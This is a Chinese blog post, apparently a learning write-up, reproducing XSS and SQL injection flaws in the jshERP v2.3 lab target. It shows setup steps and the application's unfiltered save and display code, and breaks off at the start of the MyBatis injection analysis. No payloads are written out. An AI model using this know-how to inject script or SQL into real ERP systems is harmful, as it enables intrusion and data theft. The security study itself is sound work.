<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="John Doe"/><meta name="copyright" content="John Doe"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="Hexo Theme MEOW"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="华夏_ERP_CMS_v2.3漏洞复现 | Mei的小窝"/><meta name="apple-mobile-web-app-title" content="华夏_ERP_CMS_v2.3漏洞复现 | Mei的小窝"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="http://example.com/2025/08/29/华夏-ERP-CMS-v2-3漏洞复现/"/><meta name="description" content="华夏_ERP_CMS_v2.3漏洞复现本来是想审PHP代码去漏洞挖掘的，但是部署了两个靶场都是不怎么适合我，于是就再从网上找了一个比较热门的靶场，也方便找漏洞解析，不用去CVE上面找那些漏洞了，CVE上的远古漏洞信息太少了 项目部署 我们从github上下载好源码后通过IDEA打开项目然后进行数据库配置 1jshERP-2.3\src\main\resources\application.p...">
<meta property="og:type" content="article">
<meta property="og:title" content="华夏_ERP_CMS_v2.3漏洞复现 | Mei的小窝">
<meta property="og:url" content="http://example.com/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="Mei的小窝">
<meta property="og:description" content="华夏_ERP_CMS_v2.3漏洞复现本来是想审PHP代码去漏洞挖掘的，但是部署了两个靶场都是不怎么适合我，于是就再从网上找了一个比较热门的靶场，也方便找漏洞解析，不用去CVE上面找那些漏洞了，CVE上的远古漏洞信息太少了 项目部署 我们从github上下载好源码后通过IDEA打开项目然后进行数据库配置 1jshERP-2.3\src\main\resources\application.p...">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/assets/images/Hexo-Theme-MEOW.png">
<meta property="article:published_time" content="2025-08-29T05:09:00.000Z">
<meta property="article:modified_time" content="2025-09-18T11:51:06.189Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>华夏_ERP_CMS_v2.3漏洞复现 | Mei的小窝</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
<link rel="stylesheet" href="/css/style.css">
<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 7.3.0"></head><body bg-style="none"><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="Home"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="Home"><div>Mei的小窝</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"><div class="menu-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>Articles</span></a><ul class="sub-menu-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>Archives</span></a></li><li><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>Categories</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>Tags</span></a></li><li><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>About</span></a></li></ul></div></div><div id="nav-function"><div id="menu-btn"><a href="javascript:void(0);" title="Toggle Menu"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="Home"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="Home">Mei的小窝</a></div><div class="menu-aside-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>Articles</span></a><ul class="menu-aside-sub-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>Archives</span></a></li><li><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>Categories</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>Tags</span></a></li><li><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>About</span></a></li></ul></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">「 MEOW 」</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">华夏_ERP_CMS_v2.3漏洞复现</h1><div class="post-author"><span>Author: John Doe</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>Created: 2025-08-29</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>Updated: 2025-09-18</span></div></div><div class="post-read"></div></div><div class="post-attribute"></div></div><div class="post markdown" indent="false"><h1 id="华夏-ERP-CMS-v2-3漏洞复现"><a href="#华夏-ERP-CMS-v2-3漏洞复现" class="headerlink" title="华夏_ERP_CMS_v2.3漏洞复现"></a>华夏_ERP_CMS_v2.3漏洞复现</h1><p>本来是想审PHP代码去漏洞挖掘的，但是部署了两个靶场都是不怎么适合我，于是就再从网上找了一个比较热门的靶场，也方便找漏洞解析，不用去CVE上面找那些漏洞了，CVE上的远古漏洞信息太少了</p>
<p><strong>项目部署</strong></p>
<p>我们从github上下载好源码后通过IDEA打开项目然后进行数据库配置</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jshERP-<span class="number">2.3</span>\src\main\resources\application.properties</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>配置好我们的数据库，然后在MySQL中创建<code>jsh_erp</code>数据库，导入sql文件</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jshERP-<span class="number">2.3</span>\docs\jsh_erp.sql</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>然后运行命令</p>
<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean install</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>成功打开靶场</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250829132531083.png" class title="image-20250829132531083">





<h2 id="1-XSS注入"><a href="#1-XSS注入" class="headerlink" title="1.XSS注入"></a>1.XSS注入</h2><p>这个是最容易的，我们直接触发一下</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250829173417794.png" class title="image-20250829173417794">

<p>这个有两个地方可以触发，一个是单位中如果输入js代码可以触发反射型XSS，但是因为商品信息的原因无法储存</p>
<p>然后就是添加商品信息，可以进行储存型XSS</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250829175817268.png" class title="image-20250829175817268">

<p>经过测试发现剩下的信息都可以触发XSS漏洞</p>
<p>这个漏洞很简单，就是在前端的时候没有经过过滤就储存至数据库中，回显的时候也没有过滤和转义</p>
<p>该前端代码在<code>jshERP-2.3\erp_web\pages\materials\materials.html</code>中</p>
<p>我们先来看保存的代码</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#saveMaterial&quot;</span>).<span class="title function_">off</span>(<span class="string">&quot;click&quot;</span>).<span class="title function_">on</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="comment">//给saveMaterial按钮绑定点击事件</span></span><br><span class="line">    <span class="keyword">if</span> (!$(<span class="string">&#x27;#Name&#x27;</span>).<span class="title function_">val</span>()) &#123;</span><br><span class="line">        $.messager.<span class="title function_">alert</span>(<span class="string">&#x27;提示&#x27;</span>, <span class="string">&#x27;名称不能为空！&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!$(<span class="string">&quot;#Unit&quot;</span>).<span class="title function_">val</span>() &amp;&amp; !$(<span class="string">&quot;#manyUnit&quot;</span>).<span class="title function_">val</span>()) &#123;</span><br><span class="line">        $.messager.<span class="title function_">alert</span>(<span class="string">&#x27;提示&#x27;</span>, <span class="string">&#x27;单位为必填项！&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($(<span class="string">&quot;#materialExtendData&quot;</span>).<span class="title function_">datagrid</span>(<span class="string">&#x27;getRows&#x27;</span>).<span class="property">length</span>==<span class="number">0</span>)&#123;</span><br><span class="line">        $.messager.<span class="title function_">alert</span>(<span class="string">&#x27;提示&#x27;</span>, <span class="string">&#x27;请录入条码及相关信息！&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">checkIsExist</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> objInfo = $(<span class="string">&quot;#materialFM&quot;</span>).<span class="title function_">serializeObject</span>();  <span class="comment">//serializeObject() 是一个 jQuery 插件方法，把表单中的 &lt;input&gt;、&lt;select&gt; 等元素序列化成一个 JS 对象。这个是收集materialFM表单的数据</span></span><br><span class="line">    objInfo.<span class="property">UnitId</span> = $(<span class="string">&quot;#manyUnit&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">    objInfo.<span class="property">CategoryId</span> =$(<span class="string">&quot;#parentId&quot;</span>).<span class="title function_">val</span>();<span class="comment">//这两个则是将下拉框的值放入js对象中</span></span><br><span class="line">    <span class="comment">//初始库存信息</span></span><br><span class="line">    <span class="keyword">var</span> stockArr = [];</span><br><span class="line">    $(<span class="string">&quot;#initDepot input&quot;</span>).<span class="title function_">each</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> id = $(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&quot;data-id&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> val = $(<span class="variable language_">this</span>).<span class="title function_">val</span>();</span><br><span class="line">        <span class="keyword">var</span> stockObj = &#123;&#125;;</span><br><span class="line">        stockObj.<span class="property">depotId</span> = id;</span><br><span class="line">        stockObj.<span class="property">number</span> = val;</span><br><span class="line">        stockArr.<span class="title function_">push</span>(stockObj);</span><br><span class="line">    &#125;);</span><br><span class="line">    objInfo = <span class="title function_">accept</span>(objInfo); <span class="comment">//商品价格扩展</span></span><br><span class="line">    objInfo.<span class="property">stock</span> = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(stockArr);</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;  <span class="comment">//通过ajax将数据发送到后端</span></span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;post&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: url,   <span class="comment">//发送到指定url的后端</span></span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">        <span class="attr">async</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">data</span>: (&#123;</span><br><span class="line">            <span class="attr">info</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(objInfo) <span class="comment">//设置请求体参数，也就是平时的post传参</span></span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">res</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(res &amp;&amp; res.<span class="property">code</span> === <span class="number">200</span>) &#123;</span><br><span class="line">                $(<span class="string">&#x27;#materialDlg&#x27;</span>).<span class="title function_">dialog</span>(<span class="string">&#x27;close&#x27;</span>);</span><br><span class="line">                <span class="comment">//加载完以后重新初始化</span></span><br><span class="line">                <span class="keyword">var</span> opts = $(<span class="string">&quot;#tableData&quot;</span>).<span class="title function_">datagrid</span>(<span class="string">&#x27;options&#x27;</span>);</span><br><span class="line">                <span class="title function_">showMaterialDetails</span>(opts.<span class="property">pageNumber</span>, opts.<span class="property">pageSize</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">//此处添加错误处理</span></span><br><span class="line">        <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            $.messager.<span class="title function_">alert</span>(<span class="string">&#x27;提示&#x27;</span>, <span class="string">&#x27;保存商品信息异常，请稍后再试！&#x27;</span>, <span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>我们可以看到在通过ajax发送json数据到后端中没有经过过滤</p>
<p>然后再来看回显代码</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化系统基础信息</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">initMProperty</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;/materialProperty/list&quot;</span>,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: (&#123;</span><br><span class="line">            <span class="attr">currentPage</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">pageSize</span>: <span class="number">100</span></span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(res &amp;&amp; res.<span class="property">code</span> === <span class="number">200</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(res.<span class="property">data</span> &amp;&amp; res.<span class="property">data</span>.<span class="property">page</span>) &#123;</span><br><span class="line">                    mPropertyList = res.<span class="property">data</span>.<span class="property">page</span>.<span class="property">rows</span>; <span class="comment">//属性列表 将json中的数据选择进行赋值</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">//此处添加错误处理</span></span><br><span class="line">        <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            $.messager.<span class="title function_">alert</span>(<span class="string">&#x27;查询提示&#x27;</span>, <span class="string">&#x27;查询信息异常，请稍后再试！&#x27;</span>, <span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">initMCData</span>(<span class="params">parentid_search</span>) &#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;/materialCategory/getAllList&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: (&#123;</span><br><span class="line">            <span class="attr">parentId</span>: parentid_search</span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="comment">//设置为同步</span></span><br><span class="line">        <span class="attr">async</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(res &amp;&amp; res.<span class="property">code</span> === <span class="number">200</span>)&#123;</span><br><span class="line">                materialCategoryList = res.<span class="property">data</span>;</span><br><span class="line">                <span class="keyword">if</span> (materialCategoryList != <span class="literal">null</span>) &#123;</span><br><span class="line">                    options = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; materialCategoryList.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                        <span class="keyword">var</span> materialCategory = materialCategoryList[i];</span><br><span class="line">                        types += materialCategory.<span class="property">id</span> + <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    types += parentid_search;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    types = parentid_search;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $.messager.<span class="title function_">alert</span>(<span class="string">&#x27;提示&#x27;</span>, <span class="string">&#x27;查找系统基础信息异常,请与管理员联系！&#x27;</span>, <span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>无论是保存数据还是回显数据都未经过处理，触发了XSS漏洞</p>
<h2 id="2-SQL注入漏洞"><a href="#2-SQL注入漏洞" class="headerlink" title="2.SQL注入漏洞"></a>2.SQL注入漏洞</h2><p>之前java sec code上的sql注入漏洞和PHP的一样，都是连接好数据库然后直接执行sql语句就行了但是这个我看使用的是MyBatis这一个框架</p>
<p>MyBatis 是一个 <strong>Java 持久层框架</strong>，主要用于 <strong>将数据库操作（SQL）与 Java 对象映射起来</strong>，属于 ORM（Object-Relational Mapping）的一种轻量级实现，但它与 Hibernate 等全自动 ORM 框架不同，强调 <strong>手写 SQL 并手动映射</strong>。</p>
<p><strong>SqlSessionFactory</strong>：</p>
<ul>
<li>这是创建 <code>SqlSession</code> 的工厂，是 MyBatis 的“心脏”。它通常在应用启动时通过读取配置文件（如 <code>mybatis-config.xml</code>）被构建一次。</li>
</ul>
<p><strong>SqlSession</strong>：</p>
<ul>
<li>代表一次与数据库的会话。它提供了执行 SQL 命令、获取映射器（Mapper）和管理事务的方法。<strong>每个线程都应该有它自己的 <code>SqlSession</code> 实例</strong>，使用后必须关闭。</li>
</ul>
<p>我们首先定义一个接口</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    User <span class="title function_">selectUserById</span><span class="params">(<span class="type">int</span> id)</span>;</span><br><span class="line">    List&lt;User&gt; <span class="title function_">selectAllUsers</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">insertUser</span><span class="params">(User user)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p><strong>Mapper 接口</strong>：</p>
<ul>
<li>这是一个 Java 接口，你可以在其中定义数据库操作方法。MyBatis 会通过动态代理为你创建这个接口的实现类。接口中的方法名与 XML 文件中的 SQL 语句的 <code>id</code> 一一对应。</li>
</ul>
<p>这里面定义的方法和xml文件中定义的语句和参数必须一致，不然在编译的时候会报错</p>
<p>然后我们就可以在xml文件中定义我们的预处理sql语句</p>
